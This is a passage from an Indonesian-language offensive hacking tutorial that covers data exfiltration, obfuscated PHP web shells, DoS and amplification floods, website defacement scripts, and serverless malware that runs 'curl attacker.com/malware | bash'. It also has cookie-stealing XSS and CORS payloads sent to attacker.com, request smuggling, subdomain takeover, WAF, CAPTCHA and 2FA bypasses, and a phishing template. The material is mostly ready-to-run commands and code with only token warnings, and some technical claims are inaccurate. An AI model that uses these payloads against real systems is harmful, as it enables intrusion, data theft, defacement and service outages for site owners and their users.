4. **Exfiltrasi via DNS**:
   ```bash
   nslookup $(cat /etc/passwd | base64).attacker.com
   ```
5. **Exfiltrasi via ICMP**:
   ```bash
   ping -c 1 -p $(cat /etc/passwd | base64) attacker.com
   ```

---
### **Web Shell Detection & Evasion**
---
#### **📌 Web Shell Detection**
**Tools untuk mendeteksi web shell:**
| Tool | Deskripsi | Link |
|------|-----------|------|
| **PHP Malware Finder** | Deteksi PHP malware | [github.com/nbs-system/php-malware-finder](https://github.com/nbs-system/php-malware-finder) |
| **ClamAV** | Antivirus | `apt install clamav` |
| **YARA Rules** | Deteksi malware dengan rules | [yara-rules.github.io](https://yara-rules.github.io/) |
| **AI-Bolit** | Deteksi malware di website | [revisium.com/ai](https://revisium.com/ai/) |

**Contoh YARA Rule untuk PHP Web Shell:**
```yara
rule PHP_WebShell {
    meta:
        description = "Detects PHP web shells"
        author = "Security Team"
    strings:
        $s1 = "eval("
        $s2 = "system("
        $s3 = "exec("
        $s4 = "passthru("
        $s5 = "shell_exec("
        $s6 = "${_GET"
        $s7 = "${_POST"
        $s8 = "${_REQUEST"
    condition:
        any of them
}
```

---
#### **📌 Web Shell Evasion**
**Teknik untuk menghindari deteksi:**
| Teknik | Deskripsi | Contoh |
|--------|-----------|--------|
| **Obfuscation** | Mengaburkan kode | `eval(base64_decode("aWQ="))` |
| **Encoding** | Encode kode | `eval(gzuncompress(base64_decode("H4sIA...")))` |
| **Chunked Encoding** | Bagi kode ke bagian kecil | `eval(str_rot13("vq="))` |
| **Dynamic Code** | Kode di-generate saat runtime | `eval(file_get_contents("http://attacker.com/code.txt"))` |
| **Fileless** | Kode disimpan di memory | `php -r 'eval(file_get_contents("php://input"));' < payload.php` |
| **Polymorphism** | Kode berubah tiap request | Gunakan variable random |
| **Steganography** | Sembunyikan kode di gambar | `move_uploaded_file($_FILES['file']['tmp_name'], '/var/www/html/shell.jpg');` |

**Contoh Obfuscated PHP Shell:**
```php
<?php
$a = "e"."v"."a"."l";
$b = "s"."y"."s"."t"."e"."m";
$c = $_GET['cmd'];
$a($b($c));
?>
```

---
---
---

## **🔹 BAB 12: DENIAL OF SERVICE (DoS/DDoS) LANJUTAN**

---

### **Pengertian DoS/DDoS**
- **DoS (Denial of Service)**: Serangan yang **mengganggu layanan** hingga tidak bisa diakses.
- **DDoS (Distributed Denial of Service)**: DoS yang **dikerjakan dari multiple sumber** (botnet).

**Jenis-Jenis DoS/DDoS:**
| Jenis | Deskripsi | Contoh |
|-------|-----------|--------|
| **Volumetric** | Membanjiri bandwidth | SYN Flood, UDP Flood |
| **Protocol** | Mengeksploitasi kelemahan protokol | SYN Flood, Ping of Death |
| **Application** | Serangan di layer aplikasi | HTTP Flood, Slowloris |
| **Amplification** | Memanfaatkan server untuk amplify traffic | DNS Amplification, NTP Amplification |

---
### **Tools DoS/DDoS**
| Tool | Deskripsi | Link |
|------|-----------|------|
| **hping3** | SYN/UDP/ICMP Flood | `apt install hping3` |
| **LOIC** | HTTP Flood | [sourceforge.net/projects/loic/](https://sourceforge.net/projects/loic/) |
| **Slowloris** | HTTP Slow Attack | [github.com/gkbrk/slowloris](https://github.com/gkbrk/slowloris) |
| **T50** | Stress testing tool | [github.com/Greenwolf/t50](https://github.com/Greenwolf/t50) |
| **GoldenEye** | HTTP Flood | [github.com/jseidl/GoldenEye](https://github.com/jseidl/GoldenEye) |
| **XOIC** | LOIC for Linux | [github.com/Greenwolf/XOIC](https://github.com/Greenwolf/XOIC) |
| **DDOSIM** | DDoS Simulator | [github.com/shayanzp/ddosim](https://github.com/shayanzp/ddosim) |

---
### **Exploitasi DoS/DDoS**
---
#### **📌 SYN Flood**
**Konsep:** Mengirim **banyak SYN packets** tanpa **ACK**, sehingga server **kehabisan connection**.

**Cara Pakai hping3:**
```bash
hping3 -S --flood -p 80 target.com
```
- `-S`: SYN packets.
- `--flood`: Kirim paket secepat mungkin.
- `-p 80`: Port target.

---
#### **📌 UDP Flood**
**Konsep:** Mengirim **banyak UDP packets** ke port acak.

**Cara Pakai hping3:**
```bash
hping3 --udp --flood -p 53 target.com
```
- `--udp`: UDP packets.
- `-p 53`: Port target (contoh: DNS).

---
#### **📌 HTTP Flood**
**Kontoh:** Mengirim **banyak HTTP request** untuk membanjiri server.

**Cara Pakai hping3:**
```bash
hping3 -p 80 --flood target.com
```

**Cara Pakai LOIC:**
1. **Download LOIC**.
2. **Pilih target** (IP/URL).
3. **Set method** (HTTP, UDP, TCP).
4. **Set threads** (semakin banyak, semakin kuat).
5. **Start attack**.

---
#### **📌 Slowloris**
**Konsep:** Membuka **banyak koneksi HTTP** dan **menjaga koneksi tetap terbuka** untuk membanjiri server.

**Cara Pakai:**
```bash
git clone https://github.com/gkbrk/slowloris.git
cd slowloris
python3 slowloris.py target.com -p 80 -s 500
```
- `-p 80`: Port target.
- `-s 500`: Jumlah socket.

---
#### **📌 DNS Amplification**
**Konsep:** Memanfaatkan **DNS server** untuk **amplify traffic** (1 request → 100x response).

**Cara Pakai:**
```bash
hping3 --udp --flood -p 53 --rand-dest target.com --spoof IP_FAKE
```
- `--rand-dest`: Random destination.
- `--spoof IP_FAKE`: Spoof source IP.

**Tools:**
- [DNS Amplification Scanner](https://github.com/OffensivePython/Nmap-NSE-DNS-Amplification-Scanner)

---
#### **📌 NTP Amplification**
**Konsep:** Memanfaatkan **NTP server** untuk amplify traffic.

**Cara Pakai:**
```bash
hping3 --udp --flood -p 123 --rand-dest target.com --spoof IP_FAKE
```

---
#### **📌 Memcached Amplification**
**Konsep:** Memanfaatkan **Memcached server** untuk amplify traffic (1 request → 10,000x response).

**Cara Pakai:**
```bash
hping3 --udp --flood -p 11211 --rand-dest target.com --spoof IP_FAKE
```

---
### **Bypass DoS Protection**
---
#### **📌 Bypass dengan IP Rotation**
**Teknik:** Ganti **IP tiap request** untuk menghindari rate limiting.

**Cara Pakai:**
```bash
# List proxy
proxies = ["http://proxy1:8080", "http://proxy2:8080"]

# Gunakan proxy tiap request
for proxy in proxies:
    requests.get("http://target.com", proxies={"http": proxy, "https": proxy})
```

---
#### **📌 Bypass dengan Slow Requests**
**Teknik:** Kirim request **perlahan** untuk menghindari deteksi.

**Cara Pakai (Slowloris):**
```bash
python3 slowloris.py target.com -p 80 -s 500 --https
```

---
#### **📌 Bypass dengan User-Agent Rotation**
**Teknik:** Ganti **User-Agent tiap request**.

**Cara Pakai:**
```python
import requests
import random

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)"
]

for i in range(1000):
    headers = {"User-Agent": random.choice(user_agents)}
    requests.get("http://target.com", headers=headers)
```

---
#### **📌 Bypass dengan Request Fragmentation**
**Teknik:** Bagi request ke **bagian kecil** untuk menghindari deteksi.

**Cara Pakai:**
```bash
# Fragmented SYN Flood
hping3 -S -f --flood -p 80 target.com
```
- `-f`: Fragmented packets.

---
#### **📌 Bypass dengan Encrypted Traffic (HTTPS)**
**Teknik:** Gunakan **HTTPS** untuk menghindari deteksi di layer network.

**Cara Pakai:**
```bash
# HTTPS Flood
hping3 -S --flood -p 443 target.com
```

---
### **DDoS-as-a-Service (Booter)**
**Konsep:** Layanan **DDoS for hire** (bayar untuk serangan).

**Contoh Website:**
- [Booter.xyz](https://booter.xyz) (contoh, **ILEGAL**)
- [StressThem.to](https://stressthem.to) (contoh, **ILEGAL**)

**⚠️ PERINGATAN:**
- **Menggunakan layanan ini adalah ILEGAL** dan berakibat **hukuman penjara**.
- **Jangan pernah digunakan tanpa izin**.

---
---
---

## **🔹 BAB 13: WEBSITE DEFACEMENT**

---

### **Pengertian Defacement**
Website Defacement adalah **mengganti konten website** dengan **pesan attacker** (contoh: hacktivism, propaganda, dll).

---
### **Deteksi Defacement Vulnerability**
1. **Cek apakah website mengizinkan upload file** (lihat Bab 7).
2. **Cek apakah website mengizinkan edit konten** (CMS, admin panel).
3. **Cek apakah ada RCE** (lihat Bab 6).

---
### **Exploitasi Defacement**
---
#### **📌 Defacement via File Upload**
1. **Upload file HTML** dengan pesan attacker:
   ```html
   <html>
   <head><title>Hacked by [K]</title></head>
   <body>
       <h1 style="color: red; text-align: center;">Hacked by [K]</h1>
       <p style="text-align: center;">This website has been defaced!</p>
   </body>
   </html>
   ```
2. **Upload file** ke website (via file upload vulnerability).
3. **Ganti index.php** dengan file HTML:
   ```bash
   mv /var/www/html/index.php /var/www/html/index.bak
   mv /var/www/html/defaced.html /var/www/html/index.php
   ```

---
#### **📌 Defacement via RCE**
1. **Dapatkan RCE** (lihat Bab 6).
2. **Ganti index.php**:
   ```bash
   echo "<h1>Hacked by [K]</h1>" > /var/www/html/index.php
   ```
3. **Atau overwrite file**:
   ```bash
   sed -i 's/.*/<h1>Hacked by [K]<\/h1>/' /var/www/html/index.php
   ```

---
#### **📌 Defacement via Database**
1. **Dapatkan SQLi** (lihat Bab 3).
2. **Update konten website**:
   ```sql
   UPDATE pages SET content = '<h1>Hacked by [K]</h1>' WHERE id = 1;
   ```

---
### **Tools Defacement**
| Tool | Deskripsi | Link |
|------|-----------|------|
| **Defacer ID** | Tool defacement | [github.com/DefacerID/DefacerID](https://github.com/DefacerID/DefacerID) |
| **WebDav** | Upload file via WebDav | `davtest -url http://target.com` |
| **Metasploit** | Exploit CMS | `use exploit/multi/http/wordpress_pingback` |

---
#### **📌 Automasi Defacement**
**Script Python untuk Defacement:**
```python
import requests

target = "http://target.com/upload.php"
defacement_html = """
<html>
<head><title>Hacked by [K]</title></head>
<body>
    <h1 style="color: red; text-align: center;">Hacked by [K]</h1>
    <p style="text-align: center;">This website has been defaced!</p>
</body>
</html>
"""

files = {'file': ('defaced.html', defacement_html, 'text/html')}
response = requests.post(target, files=files)

if response.status_code == 200:
    print("[+] Defacement successful!")
    print(f"[+] Check: http://target.com/defaced.html")
else:
    print("[-] Defacement failed")
```

---
---
---

## **🔹 BAB 14: TEKNIK LANJUTAN 2026**

---

### **Cloud-Based Attacks**
**Konsep:** Memanfaatkan **layanan cloud** (AWS, Google Cloud, Azure) untuk **hosting malware, C2, atau serangan**.

---
#### **📌 AWS S3 Bucket Hijacking**
**Konsep:** Mencari **S3 bucket** yang **tidak terproteksi** dan **meng-upload malware**.

**Cara Pakai:**
```bash
# Cari S3 bucket
aws s3 ls

# Cek apakah bucket public
aws s3api get-bucket-acl --bucket BUCKET_NAME

# Upload file
aws s3 cp malware.php s3://BUCKET_NAME/malware.php --acl public-read
```

**Tools:**
- [BucketStream](https://bucketstream.com/)
- [S3Scanner](https://github.com/sa7mon/S3Scanner)

---
#### **📌 Google Cloud Storage Hijacking**
**Konsep:** Mencari **Google Cloud Storage bucket** yang tidak terproteksi.

**Cara Pakai:**
```bash
# List buckets
gsutil ls

# Cek ACL
gsutil acl get gs://BUCKET_NAME

# Upload file
gsutil cp malware.php gs://BUCKET_NAME/malware.php
gsutil acl ch -u AllUsers:R gs://BUCKET_NAME/malware.php
```

---
#### **📌 Azure Blob Storage Hijacking**
**Konsep:** Mencari **Azure Blob Storage** yang tidak terproteksi.

**Cara Pakai:**
```bash
# List containers
az storage container list --account-name ACCOUNT_NAME --account-key ACCOUNT_KEY

# Upload file
az storage blob upload --account-name ACCOUNT_NAME --account-key ACCOUNT_KEY -c CONTAINER_NAME -f malware.php -n malware.php --public-access blob
```

---
### **Serverless Attacks**
**Konsep:** Memanfaatkan **serverless functions** (AWS Lambda, Google Cloud Functions) untuk **menjalankan malware tanpa server**.

---
#### **📌 AWS Lambda for Malware**
**Cara Pakai:**
1. **Buat Lambda Function**:
   ```javascript
   exports.handler = async (event) => {
       const { execSync } = require('child_process');
       return execSync('curl http://attacker.com/malware | bash');
   };
   ```
2. **Trigger Lambda** (via API Gateway, S3, dll).

**Tools:**
- [Serverless Framework](https://www.serverless.com/)

---
#### **📌 Google Cloud Functions for Malware**
**Cara Pakai:**
1. **Buat Cloud Function**:
   ```javascript
   exports.helloWorld = (req, res) => {
       const { execSync } = require('child_process');
       execSync('curl http://attacker.com/malware | bash');
       res.send('OK');
   };
   ```
2. **Deploy function**.

---
### **Web Cache Poisoning**
**Konsep:** Memanfaatkan **cache** untuk **menyajikan konten berbahaya** ke korban.

---
#### **📌 Deteksi Web Cache Poisoning**
1. **Cari parameter yang tercermin di response**:
   ```bash
   curl -v "http://target.com/?param=test"
   ```
2. **Cek apakah parameter mempengaruhi cache**:
   ```bash
   curl -v "http://target.com/?param=<script>alert(1)</script>"
   ```
3. **Jika cache menyimpan script**, maka **vulnerable**.

---
#### **📌 Exploitasi Web Cache Poisoning**
**Payload:**
```
http://target.com/?param=<script>alert(document.cookie)</script>
```
- **Korban mengakses halaman** → **script dieksekusi dari cache**.

**Tools:**
- [Param Miner](https://github.com/PortSwigger/param-miner)

---
### **HTTP Request Smuggling**
**Konsep:** Memanfaatkan **perbedaan interpretasi HTTP request** antara **front-end (load balancer) dan back-end (server)** untuk **smuggle request**.

---
#### **📌 CL.TE (Content-Length vs Transfer-Encoding)**
**Payload:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
```
- **Front-end** (load balancer) menganggap request **selesai** setelah `0\r\n\r\n`.
- **Back-end** (server) menganggap request **belum selesai** dan memproses `GET /admin`.

**Exploitasi:**
- **Smuggle request ke `/admin`** → **akses halaman admin tanpa autentikasi**.

**Tools:**
- [Burp Suite HTTP Request Smuggler](https://portswigger.net/bappstore/aa87d333947b4118a9261f67b3344079)

---
#### **📌 TE.CL (Transfer-Encoding vs Content-Length)**
**Payload:**
```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 3

8
SMUGGLED
0

GET /admin HTTP/1.1
Host: target.com
```
- **Front-end** (load balancer) memproses **chunked request**.
- **Back-end** (server) memproses **Content-Length**.

---
### **GraphQL Attacks**
**Konsep:** Mengeksploitasi **kerentanan dalam GraphQL API**.

---
#### **📌 Introspection Query**
**Payload:**
```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```
- **Output:** **Schema GraphQL** (daftar types, queries, mutations).

---
#### **📌 Batch Query Attack**
**Payload:**
```graphql
query {
  user1: user(id: 1) { username }
  user2: user(id: 2) { username }
  user3: user(id: 3) { username }
}
```
- **Mengakses data multiple user dalam 1 request**.

---
#### **📌 DoS via Complex Query**
**Payload:**
```graphql
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            ... (100 level nested)
          }
        }
      }
    }
  }
}
```
- **Membuat server kehabisan resource**.

**Tools:**
- [GraphQL Cop](https://github.com/doyensec/graphql-cop)

---
### **WebSocket Attacks**
**Konsep:** Mengeksploitasi **WebSocket** untuk **serangan real-time**.

---
#### **📌 WebSocket SSRF**
**Payload:**
```javascript
// Koneksi ke WebSocket
const ws = new WebSocket('wss://target.com/ws');

// Kirim request ke internal IP
ws.onopen = () => {
    ws.send(JSON.stringify({
        action: 'fetch',
        url: 'http://169.254.169.254/latest/meta-data/'
    }));
};

ws.onmessage = (e) => {
    console.log(e.data);  // Output: AWS metadata
};
```

---
#### **📌 WebSocket XSS**
**Payload:**
```javascript
// Koneksi ke WebSocket
const ws = new WebSocket('wss://target.com/ws');

// Kirim XSS payload
ws.onopen = () => {
    ws.send(JSON.stringify({
        action: 'broadcast',
        message: '<img src=x onerror=alert(1)>'
    }));
};
```
- **Semua korban yang connected** → **XSS dieksekusi**.

---
### **CORS Misconfigurations**
**Konsep:** Mengeksploitasi **misconfigurasi CORS** untuk **mengakses API dari domain lain**.

---
#### **📌 Deteksi CORS Misconfigurations**
```bash
# Cek header CORS
curl -I -H "Origin: http://attacker.com" http://target.com/api/users

# Jika response mengandung:
# Access-Control-Allow-Origin: *
# Access-Control-Allow-Credentials: true
# → Vulnerable!
```

---
#### **📌 Exploitasi CORS Misconfigurations**
**Payload (HTML):**
```html
<script>
fetch('http://target.com/api/users', {
    credentials: 'include'
})
.then(response => response.json())
.then(data => {
    fetch('http://attacker.com/steal?data=' + encodeURIComponent(JSON.stringify(data)));
});
</script>
```
- **Jika `Access-Control-Allow-Origin: *` + `Access-Control-Allow-Credentials: true`** → **data bisa dicuri**.

---
### **Subdomain Takeover**
**Konsep:** **Mengambil alih subdomain** yang **mengarah ke layanan cloud yang tidak digunakan** (contoh: AWS S3, GitHub Pages, Heroku).

---
#### **📌 Deteksi Subdomain Takeover**
1. **Cari subdomain** yang mengarah ke layanan cloud:
   ```bash
   subfinder -d target.com -o subdomains.txt
   ```
2. **Cek apakah subdomain mengarah ke layanan cloud**:
   ```bash
   cat subdomains.txt | httpx -title -tech-detect | grep -i "aws\|github\|heroku"
   ```
3. **Cek apakah layanan cloud bisa diambil alih**:
   ```bash
   # Cek AWS S3
   aws s3 ls s3://SUBDOMAIN.target.com

   # Cek GitHub Pages
   curl -I https://SUBDOMAIN.target.com

   # Cek Heroku
   curl -I http://SUBDOMAIN.target.com
   ```

---
#### **📌 Exploitasi Subdomain Takeover**
1. **Daftar layanan cloud** (AWS, GitHub, Heroku, dll).
2. **Buat bucket/repo** dengan nama yang sama dengan subdomain:
   ```bash
   # AWS S3
   aws s3 mb s3://SUBDOMAIN.target.com

   # GitHub Pages
   git clone https://github.com/username/SUBDOMAIN.target.com.git
   cd SUBDOMAIN.target.com
   echo "<h1>Hacked by [K]</h1>" > index.html
   git add .
   git commit -m "Defacement"
   git push
   ```
3. **Akses subdomain** → **konten attacker yang muncul**.

**Tools:**
- [Subjack](https://github.com/haccer/subjack)
- [Takeover](https://github.com/m4ll0k/takeover)

---
---
---

## **🔹 BAB 15: BYPASS TEKNIK PERTAHANAN**

---

### **Bypass Firewall**
---
#### **📌 Bypass dengan Port Scanning Alternatif**
| Teknik | Deskripsi | Contoh |
|--------|-----------|--------|
| **Fragmented Packets** | Bagi paket ke bagian kecil | `nmap -f target.com` |
| **Decoy Scan** | Sembunyikan IP attacker | `nmap -D RND:10 target.com` |
| **Idle Scan** | Scan via zombie host | `nmap -sI zombie_host target.com` |
| **TCP SYN Ping** | Ping via TCP SYN | `nmap -PS target.com` |
| **UDP Ping** | Ping via UDP | `nmap -PU target.com` |
| **SCTP Ping** | Ping via SCTP | `nmap -PY target.com` |
| **ICMP Ping** | Ping via ICMP | `nmap -PE target.com` |

---
#### **📌 Bypass dengan Protocol Alternatif**
| Protocol | Port | Deskripsi |
|----------|------|-----------|
| **HTTP** | 80 | Standard web |
| **HTTPS** | 443 | Web encrypted |
| **DNS** | 53 | DNS queries |
| **FTP** | 21 | File transfer |
| **SMTP** | 25 | Email |
| **SMB** | 445 | Windows file sharing |
| **RDP** | 3389 | Remote Desktop |
| **SSH** | 22 | Secure Shell |
| **Telnet** | 23 | Unencrypted remote shell |

**Contoh:**
```bash
# Scan via DNS
nmap -p 53 -sU target.com

# Scan via SMB
nmap -p 445 --script smb-os-discovery target.com
```

---
#### **📌 Bypass dengan IP Spoofing**
**Konsep:** **Mengganti source IP** untuk menghindari deteksi.

**Cara Pakai:**
```bash
# Spoof IP dengan hping3
hping3 -S -a 1.1.1.1 target.com -p 80

# Spoof IP dengan Scapy (Python)
from scapy.all import *
ip = IP(src="1.1.1.1", dst="target.com")
tcp = TCP(dport=80)
pkt = ip/tcp/"GET / HTTP/1.1\r\nHost: target.com\r\n\r\n"
send(pkt)
```

---
### **Bypass WAF**
WAF (Web Application Firewall) adalah **layer pertahanan** yang **memblokir serangan umum** (SQLi, XSS, RCE, dll).

---
#### **📌 Bypass WAF dengan Encoding**
| Encoding | Contoh | Deskripsi |
|----------|--------|-----------|
| **URL Encoding** | `%3Cscript%3E` | `<script>` |
| **Double URL Encoding** | `%253Cscript%253E` | `%3Cscript%3E` |
| **Hex Encoding** | `0x3Cscript0x3E` | `<script>` |
| **Unicode Encoding** | `\u003Cscript\u003E` | `<script>` |
| **HTML Encoding** | `&lt;script&gt;` | `<script>` |

**Contoh:**
```
http://target.com/page.php?id=%3Cscript%3Ealert(1)%3C/script%3E
```

---
#### **📌 Bypass WAF dengan HTTP Parameter Pollution (HPP)**
**Konsep:** Mengirim **parameter ganda** untuk membingungkan WAF.

**Contoh:**
```
http://target.com/page.php?id=1&id=' OR 1=1--
```
- **WAF** melihat: `id=1`
- **Backend** melihat: `id=' OR 1=1--`

---
#### **📌 Bypass WAF dengan Null Byte (%00)**
**Konsep:** Beberapa backend **mengabaikan input setelah null byte** (`%00`).

**Contoh:**
```
http://target.com/page.php?id=1%00' OR 1=1--
```
- **WAF** melihat: `id=1`
- **Backend** melihat: `id=1' OR 1=1--`

---
#### **📌 Bypass WAF dengan HTTP Header Injection**
**Konsep:** Memanfaatkan **header HTTP** untuk bypass.

**Contoh:**
```http
GET /page.php HTTP/1.1
Host: target.com
X-Forwarded-For: 1.1.1.1
X-Originating-IP: 1.1.1.1
X-Real-IP: 1.1.1.1
```
- Beberapa WAF **menggunakan header ini** untuk mendeteksi IP.

---
#### **📌 Bypass WAF dengan Slow Requests**
**Konsep:** Kirim request **perlahan** untuk menghindari deteksi.

**Cara Pakai (Slowloris):**
```bash
python3 slowloris.py target.com -p 80 -s 500 --https
```

---
#### **📌 Bypass WAF dengan User-Agent Rotation**
**Konsep:** Ganti **User-Agent tiap request**.

**Cara Pakai:**
```python
import requests
import random

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)"
]

for i in range(100):
    headers = {"User-Agent": random.choice(user_agents)}
    requests.get("http://target.com", headers=headers)
```

---
#### **📌 Bypass WAF dengan Cookies**
**Konsep:** Gunakan **cookies** untuk menyimpan payload.

**Contoh:**
```http
GET /page.php HTTP/1.1
Host: target.com
Cookie: id=' OR 1=1--
```
- **WAF** mungkin **tidak memeriksa cookies**.

---
#### **📌 Bypass WAF dengan JSON**
**Konsep:** Gunakan **JSON** untuk menyembunyikan payload.

**Contoh:**
```json
{
  "id": "' OR 1=1--"
}
```
- **WAF** mungkin **tidak memeriksa JSON**.

---
### **Bypass Rate Limiting**
---
#### **📌 Bypass dengan IP Rotation**
**Teknik:** Ganti **IP tiap request** menggunakan **proxy list**.

**Cara Pakai:**
```bash
# List proxy
proxies = ["http://proxy1:8080", "http://proxy2:8080"]

# Gunakan proxy tiap request
for proxy in proxies:
    requests.get("http://target.com", proxies={"http": proxy, "https": proxy})
```

**Tools:**
- [ProxyScrape](https://proxyscrape.com/) (Free Proxy List)
- [FreeProxyList](https://free-proxy-list.net/)

---
#### **📌 Bypass dengan Slow Requests**
**Teknik:** Kirim request **perlahan** untuk menghindari deteksi.

**Cara Pakai (Python):**
```python
import requests
import time

for i in range(100):
    requests.get("http://target.com")
    time.sleep(5)  # Delay 5 detik
```

---
#### **📌 Bypass dengan Session Rotation**
**Teknik:** Ganti **session/token tiap request**.

**Cara Pakai:**
```python
import requests

session = requests.Session()

for i in range(100):
    # Login ulang untuk dapatkan session baru
    login_data = {"username": "user", "password": "pass"}
    session.post("http://target.com/login", data=login_data)

    # Gunakan session untuk request
    response = session.get("http://target.com/api/data")
    print(response.text)
```

---
#### **📌 Bypass dengan Header Spoofing**
**Teknik:** Ganti **header tiap request** (contoh: `X-Forwarded-For`).

**Cara Pakai:**
```python
import requests

for i in range(100):
    headers = {
        "X-Forwarded-For": f"192.168.1.{i}",
        "User-Agent": f"Mozilla/5.0 (Windows NT {i}.0)"
    }
    requests.get("http://target.com", headers=headers)
```

---
### **Bypass CAPTCHA**
---
#### **📌 Bypass dengan OCR (Optical Character Recognition)**
**Konsep:** Gunakan **OCR** untuk **membaca CAPTCHA**.

**Tools:**
- [Tesseract OCR](https://github.com/tesseract-ocr/tesseract)
- [pytesseract](https://github.com/madmaze/pytesseract)

**Cara Pakai:**
```python
import pytesseract
from PIL import Image
import requests

# Download CAPTCHA image
response = requests.get("http://target.com/captcha.jpg")
with open("captcha.jpg", "wb") as f:
    f.write(response.content)

# Read CAPTCHA dengan OCR
captcha = pytesseract.image_to_string(Image.open("captcha.jpg"))
print(f"CAPTCHA: {captcha}")
```

---
#### **📌 Bypass dengan CAPTCHA Solving Services**
**Konsep:** Gunakan **layanan CAPTCHA solving** (bayar per solve).

**Contoh Layanan:**
- [2Captcha](https://2captcha.com/)
- [Anti-Captcha](https://anti-captcha.com/)
- [DeathByCaptcha](https://deathbycaptcha.com/)

**Cara Pakai (2Captcha):**
```python
import requests

API_KEY = "YOUR_API_KEY"
CAPTCHA_IMAGE_URL = "http://target.com/captcha.jpg"

# Kirim CAPTCHA ke 2Captcha
response = requests.post(
    "http://2captcha.com/in.php",
    data={
        "key": API_KEY,
        "method": "base64",
        "body": requests.get(CAPTCHA_IMAGE_URL).content,
        "json": 1
    }
)

# Dapatkan ID CAPTCHA
captcha_id = response.json()["request"]

# Cek status
while True:
    response = requests.get(
        f"http://2captcha.com/res.php?key={API_KEY}&action=get&id={captcha_id}&json=1"
    )
    if response.json()["status"] == 1:
        captcha = response.json()["request"]
        print(f"CAPTCHA: {captcha}")
        break
    time.sleep(5)
```

---
#### **📌 Bypass dengan CAPTCHA Bypass Tokens**
**Konsep:** Beberapa website **menggunakan token** untuk bypass CAPTCHA (contoh: reCAPTCHA v2).

**Cara Pakai:**
1. **Temukan token** (contoh: `g-recaptcha-response`).
2. **Gunakan token** dalam request.

**Contoh:**
```http
POST /login HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=user&password=pass&g-recaptcha-response=TOKEN
```

---
### **Bypass 2FA**
---
#### **📌 Bypass dengan Session Hijacking**
**Konsep:** Jika attacker **bisa mencuri session cookie**, maka **2FA bisa dibypass**.

**Cara Pakai:**
1. **Dapatkan session cookie** (via XSS, MITM, dll).
2. **Gunakan cookie** untuk login.

---
#### **📌 Bypass dengan Social Engineering**
**Konsep:** **Menipu korban** untuk memberikan **2FA code**.

**Contoh:**
- **Phishing email**:
  ```
  Subject: Your 2FA Code

  Dear User,

  Your 2FA code is: 123456

  Please enter this code to verify your account.

  Thank you,
  Security Team
  ```
- **Korban memasukkan code** → **attacker bisa login**.

---
#### **📌 Bypass dengan Token Theft**
**Konsep:** Mencuri **2FA token** (contoh: TOTP, OAuth token).

**Cara Pakai:**
1. **Dapatkan token** (via XSS, MITM, dll).
2. **Gunakan token** untuk login.

---
#### **📌 Bypass dengan Brute Force 2FA**
**Konsep:** Mencoba **semua kombinasi 2FA code** (000000-999999).

**Cara Pakai:**
```bash
# Gunakan Hydra
hydra -l user -p password -P 2fa_codes.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^&2fa=^2FA^:F=invalid"
```
- `2fa_codes.txt`: Berisi semua kombinasi 2FA (000000-999999).

**Generate 2FA Codes:**
```bash
# Generate 000000-999999
for i in {000000..999999}; do echo $i; done > 2fa_codes.txt
```

---
#### **📌 Bypass dengan Cookie Tampering**
**Konsep:** Ubah **cookie 2FA** untuk **bypass verifikasi**.

**Contoh:**
- Jika cookie `2fa_verified=0`, ubah ke `2fa_verified=1`.

---
---
---

## **🔹 BAB 16: CASE STUDY & REAL-WORLD EXAMPLES**

---

### **Case Study 1: SQL Injection di WordPress**
---
#### **📌 Vulnerability**
- **Plugin**: **WP Statistics** (v12.6.7)
- **Kerentanan**: **SQL Injection** di parameter `page`.
- **CVE**: [CVE-2021-24340](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24340)

---
#### **📌 Exploitasi**
1. **Deteksi SQLi**:
   ```bash
   sqlmap -u "http://target.com/wp-admin/admin.php?page=wp-statistics&type=referrers&referrer=test' AND 1=1--" --batch
   ```
2. **Extract Database**:
   ```bash
   sqlmap -u "http://target.com/wp-admin/admin.php?page=wp-statistics&type=referrers&referrer=test" --dbs --batch
   ```
3. **Dump Data**:
   ```bash
   sqlmap -u "http://target.com/wp-admin/admin.php?page=wp-statistics&type=referrers&referrer=test" -D wordpress -T wp_users --dump --batch
   ```

---
#### **📌 Post-Exploitation**
1. **Dapatkan admin hash**:
   ```bash
   sqlmap -u "http://target.com/wp-admin/admin.php?page=wp-statistics&type=referrers&referrer=test" -D wordpress -T wp_users -C user_pass --dump --batch
   ```
2. **Crack hash** (WordPress menggunakan MD5):
   ```bash
   hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
   ```
3. **Login ke WordPress** dengan credentials admin.

---
#### **📌 Mitigasi**
1. **Update plugin** ke versi terbaru.
2. **Gunakan WAF** (ModSecurity, Cloudflare).
3. **Validasi & sanitize input**.

---
### **Case Study 2: XSS di Facebook**
---
#### **📌 Vulnerability**
- **Kerentanan**: **Stored XSS** di fitur **Facebook Notes**.
- **CVE**: [CVE-2018-17584](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-17584)

---
#### **📌 Exploitasi**
1. **Buat Facebook Note** dengan payload XSS:
   ```html
   <img src=x onerror="alert(document.cookie)">
   ```
2. **Korban membuka note** → **XSS dieksekusi**.
3. **Steal cookies**:
   ```html
   <script>
   fetch('http://attacker.com/steal?cookie=' + document.cookie);
   </script>
   ```

---
#### **📌 Post-Exploitation**
1. **Dapatkan session cookie** korban.
2. **Gunakan cookie** untuk login sebagai korban.

---
#### **📌 Mitigasi**
1. **Sanitize HTML** (gunakan DOMPurify).
2. **Content Security Policy (CSP)**:
   ```http
   Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval';
   ```
3. **HTTP-Only & Secure Cookies**:
   ```php
   setcookie("session", $value, [
       'httponly' => true,
       'secure' => true,
       'samesite' => 'Strict'
   ]);
   ```

---
### **Case Study 3: RCE di Apache Struts**
---
#### **📌 Vulnerability**
